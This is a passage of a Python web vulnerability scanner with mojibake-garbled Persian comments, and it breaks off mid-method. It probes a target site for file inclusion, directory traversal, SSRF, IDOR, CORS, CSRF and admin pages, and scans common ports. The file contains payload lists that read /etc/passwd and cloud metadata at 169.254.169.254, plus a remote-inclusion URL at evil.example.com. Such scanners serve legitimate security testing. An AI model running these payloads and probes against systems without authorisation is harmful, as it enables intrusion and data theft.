    def find_test_params(self, url, soup):
        """Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ù‚Ø§Ø¨Ù„ ØªØ³Øª Ø¯Ø± URL Ùˆ ÙØ±Ù…â€ŒÙ‡Ø§"""
        test_params = []
        
        links = soup.find_all('a', href=True)
        for link in links:
            href = link['href']
            if '?' in href and '=' in href:
                full_url = urljoin(url, href)
                parsed_url = urlparse(full_url)
                query_params = parsed_url.query.split('&')
                
                for param in query_params:
                    if '=' in param:
                        param_name = param.split('=')[0]
                        test_url = full_url.replace(param, f"{param_name}=PARAM_VALUE")
                        test_params.append((param_name, test_url))
        
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            form_inputs = form.find_all('input')
            
            form_params = {}
            for input_tag in form_inputs:
                param_name = input_tag.get('name')
                if param_name:
                    form_params[param_name] = input_tag.get('value', 'PARAM_VALUE')
            
            if form_params:
                if form_method == 'post':
                    form_url = urljoin(url, form_action)
                    test_params.append((f"FORM_POST:{form_url}", form_url))
                else:
                    form_url = urljoin(url, form_action)
                    param_str = '&'.join([f"{k}=PARAM_VALUE" for k in form_params.keys()])
                    test_url = f"{form_url}?{param_str}" if '?' not in form_url else f"{form_url}&{param_str}"
                    test_params.append((f"FORM_GET:{form_url}", test_url))
        
        return test_params
    
    def check_csrf(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø­Ø§ÙØ¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± CSRF"""
        print("ğŸ›¡ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø­Ø§ÙØ¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± CSRF...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['csrf_protection'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ CSRF Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        csrf_protected = False
        csrf_tokens = []
        
        for form in forms:
            token_inputs = form.find_all('input', {
                'name': lambda x: x and any(token in x.lower() for token in ['csrf', 'token', '_token', 'authenticity'])
            })
            
            if token_inputs:
                csrf_protected = True
                for token_input in token_inputs:
                    csrf_tokens.append({
                        'form_action': form.get('action', ''),
                        'input_name': token_input.get('name'),
                        'input_value': token_input.get('value', '')[:50] + '...' if token_input.get('value') and len(token_input.get('value')) > 50 else token_input.get('value', '')
                    })
        
        if csrf_protected:
            self.scan_results['csrf_protection'] = {
                'status': "âœ… Ø§Ø­ØªÙ…Ø§Ù„Ø§Ù‹ Ù…Ø­Ø§ÙØ¸Øª Ø´Ø¯Ù‡",
                'tokens_found': csrf_tokens
            }
        else:
            self.scan_results['csrf_protection'] = "âš ï¸ Ø§Ø­ØªÙ…Ø§Ù„Ø§Ù‹ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ù…Ø­Ø§ÙØ¸Øª CSRF ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_file_inclusion(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ inclusion ÙØ§ÛŒÙ„"""
        print("ğŸ“‚ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ File Inclusion...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['file_inclusion'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ File Inclusion Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        soup = BeautifulSoup(response.text, 'html.parser')
        test_params = self.find_test_params(url, soup)
        
        inclusion_payloads = [
            '../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'file:///etc/passwd',
            'http://evil.example.com/test.txt',
            '/etc/passwd%00',
            '....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts'
        ]
        
        vulnerable_points = []
        
        for param_name, param_url in test_params:
            if param_name.startswith("FORM_POST:"):
                form_url = param_name.split(":", 1)[1]
                form_data = self.extract_form_data(soup, form_url)
                
                for payload in inclusion_payloads:
                    test_data = {}
                    for field_name, field_value in form_data.items():
                        test_data[field_name] = payload if field_value == "PARAM_VALUE" else field_value
                    
                    response = self.safe_request(form_url, method='POST', data=test_data)
                    
                    if response and self.detect_file_inclusion(response.text):
                        vulnerable_points.append({
                            'parameter': 'POST_FORM',
                            'url': form_url,
                            'payload': payload,
                            'method': 'POST'
                        })
                        break
            else:
                for payload in inclusion_payloads:
                    test_url = param_url.replace('PARAM_VALUE', quote(payload))
                    response = self.safe_request(test_url)
                    
                    if response and self.detect_file_inclusion(response.text):
                        vulnerable_points.append({
                            'parameter': param_name,
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        break
        
        if vulnerable_points:
            self.vulnerabilities.append("File Inclusion")
            self.scan_results['file_inclusion'] = vulnerable_points
        else:
            self.scan_results['file_inclusion'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ File Inclusion ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def detect_file_inclusion(self, content):
        """ØªØ´Ø®ÛŒØµ Ù¾Ø§Ø³Ø®â€ŒÙ‡Ø§ÛŒ Ù…Ø«Ø¨Øª File Inclusion"""
        indicators = [
            'root:', 'daemon:', 'bin/', '/etc/passwd',
            '<?php', '<?=', 'Windows System32',
            'cannot open remote file', 'failed to open stream',
            'Microsoft Corp', 'Microsoft TCP/IP for Windows',
            'boot.ini', '[boot loader]', '[operating systems]'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in indicators)
    
    def check_open_ports(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø¨Ø§Ø²"""
        print("ğŸšª Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø¨Ø§Ø²...")
        
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 9200]
        open_ports = []
        
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    result = s.connect_ex((hostname, port))
                    if result == 0:
                        open_ports.append(port)
            except:
                pass
        
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
            995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP',
            5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            27017: 'MongoDB', 9200: 'Elasticsearch'
        }
        
        open_ports_info = []
        for port in open_ports:
            service = services.get(port, 'Unknown')
            open_ports_info.append(f"{port} ({service})")
        
        if open_ports_info:
            self.scan_results['open_ports'] = f"ğŸ”“ Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø¨Ø§Ø²: {', '.join(open_ports_info)}"
        else:
            self.scan_results['open_ports'] = "âœ… Ù‡ÛŒÚ† Ù¾ÙˆØ±Øª ØºÛŒØ±Ù…Ø¹Ù…ÙˆÙ„ÛŒ Ø¨Ø§Ø² Ù†ÛŒØ³Øª"
    
    def check_info_leakage(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª"""
        print("ğŸ”“ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['info_leakage'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        content = response.text
        headers = response.headers
        
        sensitive_patterns = {
            'password': ['password', 'pwd', 'passwd', 'senha'],
            'email': ['@', 'email', 'e-mail'],
            'api_key': ['api_key', 'api-key', 'apikey', 'secret_key'],
            'token': ['token', 'access_token', 'refresh_token'],
            'database': ['database', 'db_host', 'db_user', 'db_pass'],
            'config': ['config', 'configuration', 'setting'],
            'debug': ['debug', 'testing', 'test_mode']
        }
        
        leaked_info = {}
        
        for category, patterns in sensitive_patterns.items():
            found_items = []
            for pattern in patterns:
                if pattern.lower() in content.lower():
                    found_items.append(pattern)
            
            if found_items:
                leaked_info[category] = found_items
        
        sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version']
        exposed_headers = {}
        
        for header in sensitive_headers:
            if header in headers:
                exposed_headers[header] = headers[header]
        
        if leaked_info or exposed_headers:
            self.vulnerabilities.append("Ù†Ø´Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª")
            self.scan_results['info_leakage'] = {
                'content_leaks': leaked_info,
                'header_leaks': exposed_headers
            }
        else:
            self.scan_results['info_leakage'] = "âœ… Ù‡ÛŒÚ† Ù†Ø´ØªÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¢Ø´Ú©Ø§Ø±ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_admin_pages(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ ØµÙØ­Ø§Øª Ø§Ø¯Ù…ÛŒÙ†"""
        print("ğŸ‘¨â€ğŸ’¼ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ ØµÙØ­Ø§Øª Ø§Ø¯Ù…ÛŒÙ†...")
        
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/login', 
            '/admin/login', '/user/login', '/backend', '/console',
            '/dashboard', '/controlpanel', '/manager', '/system',
            '/cpanel', '/whm', '/webadmin', '/admincp',
            '/wp-login.php', '/administrator/index.php'
        ]
        
        found_admin_pages = []
        
        for path in admin_paths:
            admin_url = url.rstrip('/') + path
            response = self.safe_request(admin_url)
            
            if response and response.status_code == 200:
                found_admin_pages.append({
                    'url': admin_url,
                    'title': self.extract_page_title(response.text),
                    'status_code': response.status_code
                })
        
        if found_admin_pages:
            self.scan_results['admin_pages'] = found_admin_pages
        else:
            self.scan_results['admin_pages'] = "âœ… Ù‡ÛŒÚ† ØµÙØ­Ù‡ Ø§Ø¯Ù…ÛŒÙ† Ø¢Ø´Ú©Ø§Ø±ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def extract_page_title(self, html_content):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¹Ù†ÙˆØ§Ù† ØµÙØ­Ù‡ Ø§Ø² HTML"""
        soup = BeautifulSoup(html_content, 'html.parser')
        title_tag = soup.find('title')
        return title_tag.get_text().strip() if title_tag else "Ø¨Ø¯ÙˆÙ† Ø¹Ù†ÙˆØ§Ù†"
    
    def check_cors_misconfig(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ Ù†Ø§Ø¯Ø±Ø³Øª CORS"""
        print("ğŸŒ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ CORS...")
        
        try:
            origin = 'https://example.com'
            headers = {'Origin': origin}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
            credentials = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if cors_headers == '*' and credentials == 'true':
                self.vulnerabilities.append("CORS Misconfiguration")
                self.scan_results['cors'] = "âŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ CORS Ù†Ø§Ø¯Ø±Ø³Øª Ø§Ø³Øª"
            elif origin in cors_headers:
                self.vulnerabilities.append("CORS Misconfiguration")
                self.scan_results['cors'] = "âŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ CORS Ù†Ø§Ø¯Ø±Ø³Øª Ø§Ø³Øª"
            else:
                self.scan_results['cors'] = "âœ… Ø§Ù…Ù† - Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ CORS Ø¨Ù‡ Ø¯Ø±Ø³ØªÛŒ Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯Ù‡ Ø§Ø³Øª"
        except:
            self.scan_results['cors'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ CORS Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
    
    def check_clickjacking(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ú©Ù„ÛŒÚ©â€ŒØ¬Ú©ÛŒÙ†Ú¯"""
        print("ğŸ–±ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ú©Ù„ÛŒÚ©â€ŒØ¬Ú©ÛŒÙ†Ú¯...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['clickjacking'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù„ÛŒÚ©â€ŒØ¬Ú©ÛŒÙ†Ú¯ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        headers = response.headers
        
        if 'X-Frame-Options' in headers:
            xfo = headers['X-Frame-Options'].upper()
            if xfo in ['DENY', 'SAMEORIGIN']:
                self.scan_results['clickjacking'] = "âœ… Ø§Ù…Ù† - Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± Ú©Ù„ÛŒÚ©â€ŒØ¬Ú©ÛŒÙ†Ú¯ Ù…Ø­Ø§ÙØ¸Øª Ø´Ø¯Ù‡ Ø§Ø³Øª"
            else:
                self.scan_results['clickjacking'] = f"âš ï¸ Ø§Ø­ØªÙ…Ø§Ù„Ø§Ù‹ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - X-Frame-Options: {xfo}"
        else:
            self.vulnerabilities.append("Clickjacking")
            self.scan_results['clickjacking'] = "âŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ù‡Ø¯Ø± X-Frame-Options ÙˆØ¬ÙˆØ¯ Ù†Ø¯Ø§Ø±Ø¯"
    
    def check_directory_traversal(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Directory Traversal"""
        print("ğŸ“ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Directory Traversal...")
        
        traversal_payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        vulnerable = False
        
        for payload in traversal_payloads:
            test_url = f"{url}?file={quote(payload)}"
            response = self.safe_request(test_url)
            
            if response and self.detect_file_inclusion(response.text):
                vulnerable = True
                break
                
        if vulnerable:
            self.vulnerabilities.append("Directory Traversal")
            self.scan_results['directory_traversal'] = "âŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ø³Ø§ÛŒØª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± Directory Traversal Ù…Ø­Ø§ÙØ¸Øª Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯"
        else:
            self.scan_results['directory_traversal'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Directory Traversal ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_http_methods(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù…ØªØ¯Ù‡Ø§ÛŒ HTTP ÙØ¹Ø§Ù„"""
        print("ğŸ”Œ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù…ØªØ¯Ù‡Ø§ÛŒ HTTP...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE', 'HEAD']
        allowed_methods = []
        
        for method in methods:
            try:
                response = self.safe_request(url, method=method)
                if response and response.status_code != 405:
                    allowed_methods.append(method)
            except:
                pass
        
        dangerous_methods = ['PUT', 'DELETE', 'TRACE']
        dangerous_found = [m for m in allowed_methods if m in dangerous_methods]
        
        if dangerous_found:
            self.vulnerabilities.append("Ù…ØªØ¯Ù‡Ø§ÛŒ HTTP Ø®Ø·Ø±Ù†Ø§Ú©")
            self.scan_results['http_methods'] = {
                'allowed_methods': allowed_methods,
                'warning': f"âš ï¸ Ù…ØªØ¯Ù‡Ø§ÛŒ Ø®Ø·Ø±Ù†Ø§Ú© ÙØ¹Ø§Ù„: {', '.join(dangerous_found)}"
            }
        else:
            self.scan_results['http_methods'] = {
                'allowed_methods': allowed_methods,
                'warning': "âœ… Ù‡ÛŒÚ† Ù…ØªØ¯ Ø®Ø·Ø±Ù†Ø§Ú©ÛŒ ÙØ¹Ø§Ù„ Ù†ÛŒØ³Øª"
            }
    
    def check_server_info(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³Ø±ÙˆØ±"""
        print("ğŸ–¥ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³Ø±ÙˆØ±...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['server_info'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³Ø±ÙˆØ± Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        headers = response.headers
        server_info = {}
        
        info_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version']
        for header in info_headers:
            if header in headers:
                server_info[header] = headers[header]
        
        info_files = {
            'phpinfo': '/phpinfo.php',
            'server-status': '/server-status',
            'server-info': '/server-info'
        }
        
        found_info_files = {}
        for name, path in info_files.items():
            info_url = url.rstrip('/') + path
            info_response = self.safe_request(info_url)
            if info_response and info_response.status_code == 200:
                found_info_files[name] = info_url
        
        if server_info or found_info_files:
            self.scan_results['server_info'] = {
                'headers': server_info,
                'info_files': found_info_files
            }
        else:
            self.scan_results['server_info'] = "âœ… Ù‡ÛŒÚ† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³Ø±ÙˆØ± Ø¢Ø´Ú©Ø§Ø±ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_backup_files(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù†"""
        print("ğŸ’¾ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù†...")
        
        backup_extensions = ['.bak', '.backup', '.old', '.save', '.sav', '.tmp', '.temp']
        backup_files = []
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['backup_files'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù† Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        scripts = soup.find_all('script', src=True)
        
        all_urls = []
        for link in links:
            all_urls.append(urljoin(url, link['href']))
        for script in scripts:
            all_urls.append(urljoin(url, script['src']))
        
        for file_url in all_urls:
            for ext in backup_extensions:
                if file_url.endswith(ext):
                    backup_response = self.safe_request(file_url)
                    if backup_response and backup_response.status_code == 200:
                        backup_files.append({
                            'url': file_url,
                            'size': len(backup_response.content),
                            'status_code': backup_response.status_code
                        })
                    break
        
        if backup_files:
            self.vulnerabilities.append("ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù¾Ø´ØªÛŒØ¨Ø§Ù† Ø¯Ø± Ù…Ø¹Ø±Ø¶ Ø¯ÛŒØ¯")
            self.scan_results['backup_files'] = backup_files
        else:
            self.scan_results['backup_files'] = "âœ… Ù‡ÛŒÚ† ÙØ§ÛŒÙ„ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ø¯Ø± Ù…Ø¹Ø±Ø¶ Ø¯ÛŒØ¯ ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_ssrf(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ SSRF"""
        print("ğŸŒ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ SSRF...")
        
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:22',
            'http://127.0.0.1:22',
            'http://0.0.0.0:22',
            'file:///etc/passwd',
            'gopher://127.0.0.1:22/_test'
        ]
        
        vulnerable_points = []
        response = self.safe_request(url)
        
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            test_params = self.find_test_params(url, soup)
            
            for param_name, param_url in test_params:
                for payload in ssrf_payloads:
                    test_url = param_url.replace('PARAM_VALUE', quote(payload))
                    response = self.safe_request(test_url)
                    
                    if response and any(indicator in response.text for indicator in ['AMI ID', 'instance-id', 'localhost', '127.0.0.1']):
                        vulnerable_points.append({
                            'parameter': param_name,
                            'url': test_url,
                            'payload': payload
                        })
                        break
        
        if vulnerable_points:
            self.vulnerabilities.append("SSRF")
            self.scan_results['ssrf'] = vulnerable_points
        else:
            self.scan_results['ssrf'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ SSRF ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_idor(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ IDOR"""
        print("ğŸ” Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ IDOR...")
        
        idor_test_cases = [
            {'id': 1, 'expected': 200},
            {'id': 2, 'expected': 200},
            {'id': 1000, 'expected': 403},  # Ù†Ø¨Ø§ÛŒØ¯ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯
            {'id': 0, 'expected': 400},     # ID Ù†Ø§Ù…Ø¹ØªØ¨Ø±
        ]
        
        vulnerable = False
        response = self.safe_request(url)
        
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† Ù„ÛŒÙ†Ú©â€ŒÙ‡Ø§ÛŒ Ø¯Ø§Ø±Ø§ÛŒ ID
            id_patterns = ['id=', 'user=', 'account=', 'document=']
            id_links = []
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if any(pattern in href for pattern in id_patterns):
                    id_links.append(href)
            
            # ØªØ³Øª IDOR
            for link in id_links[:3]:  # ÙÙ‚Ø· 3 Ù„ÛŒÙ†Ú© Ø§ÙˆÙ„ Ø±Ø§ ØªØ³Øª Ú©Ù†
                for test_case in idor_test_cases:
                    test_url = link.replace('PARAM_VALUE', str(test_case['id']))
                    response = self.safe_request(test_url)
                    
                    if response and response.status_code == 200 and test_case['expected'] != 200:
                        vulnerable = True
                        break
        
        if vulnerable:
            self.vulnerabilities.append("IDOR")
            self.scan_results['idor'] = "âŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± - Ø§Ù…Ú©Ø§Ù† Ø¯Ø³ØªØ±Ø³ÛŒ ØºÛŒØ±Ù…Ø¬Ø§Ø² Ø¨Ù‡ Ù…Ù†Ø§Ø¨Ø¹ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯"
        else:
            self.scan_results['idor'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ IDOR ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_performance(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ Ø³Ø§ÛŒØª"""
        print("âš¡ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ Ø³Ø§ÛŒØª...")
        
        load_tests = 5
        response_times = []
        
        for i in range(load_tests):
            start_time = time.time()
            response = self.safe_request(url)
            end_time = time.time()
            
            if response:
                response_time = (end_time - start_time) * 1000  # Ø¨Ù‡ Ù…ÛŒÙ„ÛŒâ€ŒØ«Ø§Ù†ÛŒÙ‡
                response_times.append(response_time)
            
            time.sleep(1)  # ØªØ£Ø®ÛŒØ± Ø¨ÛŒÙ† ØªØ³Øªâ€ŒÙ‡Ø§
        
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            max_time = max(response_times)
            min_time = min(response_times)
            
            performance_rating = "âœ… Ø¹Ø§Ù„ÛŒ" if avg_time < 500 else "âš ï¸ Ù‚Ø§Ø¨Ù„ Ù‚Ø¨ÙˆÙ„" if avg_time < 1000 else "âŒ Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø¨Ù‡Ø¨ÙˆØ¯"
            
            self.performance_metrics = {
                'average_response_time': f"{avg_time:.2f} ms",
                'max_response_time': f"{max_time:.2f} ms",
                'min_response_time': f"{min_time:.2f} ms",
                'rating': performance_rating,
                'tests_count': load_tests
            }
            
            self.scan_results['performance'] = self.performance_metrics
        else:
            self.scan_results['performance'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
    
    def generate_report(self, url):
        """ØªÙˆÙ„ÛŒØ¯ Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„"""
        print("\n" + "="*60)
        print("ğŸ“Š Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ø§Ø³Ú©Ù† Ø§Ù…Ù†ÛŒØªÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡")
        print("="*60)
        print(f"ğŸ¯ Ù‡Ø¯Ù: {url}")
        print(f"ğŸ“… ØªØ§Ø±ÛŒØ®: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("\nÙ†ØªØ§ÛŒØ¬ Ø¨Ø±Ø±Ø³ÛŒ:")
        
        for key, value in self.scan_results.items():
            if isinstance(value, dict):
                print(f"\n{key.replace('_', ' ').title()}:")
                for sub_key, sub_value in value.items():
                    print(f"  {sub_key}: {sub_value}")
            elif isinstance(value, list):
